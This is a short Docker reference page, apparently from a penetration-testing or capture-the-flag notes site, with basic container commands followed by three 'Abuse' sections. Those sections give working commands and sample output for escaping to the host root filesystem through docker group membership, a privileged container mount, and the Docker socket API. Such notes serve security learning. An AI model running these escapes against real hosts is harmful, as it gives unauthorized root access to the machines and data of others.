---
title: "Docker"
date: 2024-7-3
tags: ["Forensic", "Docker", "Container", "Dive"]
---

### Basic Commands

```console
# Show All Running Docker Processes
sudo docker ps -a
```

```console
# Show All Docker Images
sudo docker images -a
```

```console
# Stop All Docker Processes
sudo docker stop $(sudo docker ps -a -q)
```

```console
# Remove All Docker Processes
sudo docker rm -vf $(sudo docker ps -a -q)
```

```console
# Remove All Docker Images
sudo docker rmi -f $(sudo docker images -aq)
```

```console
# Shell in Container
sudo docker exec -it <CONTAINER_ID> bash
```

```console
# Privileged Shell in Container
sudo docker exec -it --privileged --user root <CONTAINER_ID> bash
```

```console
# Copy File from Host to Container
sudo docker cp <HOST_FILE_PATH> <CONTAINER_ID>:<CONTAINER_FILE_PATH>
```

```console
# Copy File from Container to Host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FILE_PATH> <HOST_FILE_PATH>
```

```console
# Copy Folder from Host to Container
sudo docker cp <HOST_FOLDER_PATH>/. <CONTAINER_ID>:<CONTAINER_TARGET_PATH>
```

```console
# Copy Folder from Container to Host
sudo docker cp <CONTAINER_ID>:<CONTAINER_FOLDER_PATH>/. <HOST_TARGET_PATH>
```

---

### Explore Docker image

{{< tab set1 tab1 >}}dive{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
dive docker-archive://image.tar
```

<small>*Ref: [dive](https://github.com/wagoodman/dive)*</small>

{{< /tabcontent >}}

---

### Abuse #1: Docker group

```console
# List Docker Images
docker images
```

```console {class="sample-code"}
$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   2 years ago   5.53MB
```

```console
# Mount Host root Filesystem
docker run -v /:/mnt -it <IMAGE_ID> sh
```

```console {class="sample-code"}
$ docker run -v /:/mnt -it d7d3d98c851f sh  
/ # 
```

```console
# Check
ls /mnt/root
```

```console {class="sample-code"}
/ # ls /mnt/root
root.txt
```

---

### Abuse #2: Docker Escape (With Root)

```console
# Take Note of the Host Mount
mount
```

```console
sudo docker exec -it --privileged --user root <CONTAINER_ID> bash
```

```console
# Mount Host root Filesystem
mount /dev/sda1 /mnt
```

```console
# Check
ls /mnt/root
```

---

### Abuse #3: Docker API

```console
# Show Running Containers
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```console {class="sample-code"}
root@2d24bf61767c:/root# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]
```

```console
# Create Container
curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "<IMAGE_NAME>:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
```

```console {class="sample-code"}
(remote) root@2d24bf61767c:/root# curl -s -X POST -H 'Content-Type: application/json' --data-binary '{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/r"]}, "Cmd": ["/bin/sh", "-c", "ls -la /r/root/"], "Tty": true}' --unix-socket /var/run/docker.sock http://localhost/containers/create
{"Id":"ec28a9d1ae931fb81ac1c2640d1aac24bf1e7172bd6c42f02400659c299157cd","Warnings":[]}
```

```console
# Start Container
curl -i -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/<CONTAINER_ID>/start
```

```console {class="sample-code"}
(remote) root@2d24bf61767c:/root# curl -i -X POST -H 'Content-Type: application/json' --unix-socket /var/run/docker.sock http://localhost/containers/9115/start
HTTP/1.1 204 No Content
Api-Version: 1.40
Docker-Experimental: false
Ostype: linux
Server: Docker/19.03.8 (linux)
Date: Mon, 23 Sep 2024 04:29:11 GMT
```

```console
# Show Results
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<CONTAINER_ID>/logs?stderr=1&stdout=1"
```

```console {class="sample-code"}
(remote) root@2d24bf61767c:/root# curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/9115/logs?stderr=1&stdout=1"
total 56
drwx------    6 root     root          4096 Sep 23 04:06 .
drwxr-xr-x   20 root     root          4096 Feb  9  2021 ..
lrwxrwxrwx    1 root     root             9 Jun 17  2020 .bash_history -> /dev/null
-rw-r--r--    1 root     root          3106 Dec  5  2019 .bashrc
drwx------    2 root     root          4096 Jun 30  2020 .cache
drwxr-xr-x    3 root     root          4096 Jun 30  2020 .local
-rw-r--r--    1 root     root           161 Dec  5  2019 .profile
-rw-r--r--    1 root     root            75 Jun 30  2020 .selected_editor
drwx------    2 root     root          4096 Jun 30  2020 .ssh
-rw-------    1 root     root         12235 Aug 26  2020 .viminfo
-rw-r--r--    1 root     root           165 Jun 30  2020 .wget-hsts
-rw-------    1 root     root            33 Sep 23 04:06 root.txt
drwxr-xr-x    3 root     root          4096 May 18  2020 snap
```
